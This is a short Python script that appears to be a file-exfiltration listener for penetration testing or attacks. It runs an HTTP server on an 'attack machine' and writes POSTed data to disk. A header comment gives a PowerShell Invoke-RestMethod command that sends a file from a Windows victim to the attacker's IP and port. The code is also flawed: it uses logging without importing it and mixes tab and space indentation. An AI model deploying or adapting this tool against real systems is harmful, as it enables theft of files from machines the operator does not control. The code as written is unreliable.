# ON WINDOWS MACHINE RUN:
#   Invoke-RestMethod -Uri <attackMachineIP>:<serverPort> -Method Post -InFile <filename> -UseDefaultCredentials


import http.server
import socketserver

ATTACK_MACHINE_IP = "0.0.0.0"
SERVER_PORT = 9999

class CustomHandler(http.server.BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
    def do_GET(self):
		logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
		self._set_response()
		self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
    def do_POST(self):
        content_length = int(self.headers['Content-length'])
        post_data = self.rfile.read(content_length)
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",str(self.path), str(self.headers), post_data.decode('utf-8'))

        # Need to pay attention to file type and change accordingly
        with open("s1.png", "wb") as f:
            f.write(post_data)

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

Handler = CustomHandler
with socketserver.TCPServer((ATTACK_MACHINE_IP, SERVER_PORT), Handler) as httpd:
    httpd.serve_forever()
